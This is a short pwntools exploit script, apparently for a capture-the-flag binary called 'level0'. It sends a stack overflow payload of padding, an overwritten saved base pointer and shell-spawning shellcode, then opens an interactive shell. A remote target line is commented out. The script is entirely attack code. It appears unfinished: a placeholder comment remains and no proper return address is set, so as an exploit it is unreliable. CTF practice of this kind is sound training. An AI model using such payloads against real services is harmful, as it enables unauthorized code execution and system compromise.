from pwn import *

context(arch='amd64', os='linux')
# context(os='linux', arch='amd64', log_level='debug')

# r = remote('exploitme.example.com', 31337)
r = process('./level0')

buf = cyclic(0x80)
rbp = cyclic(8)

payload = buf + rbp + asm(shellcraft.sh())
# EXPLOIT CODE GOES HERE
r.send(payload)
r.interactive()
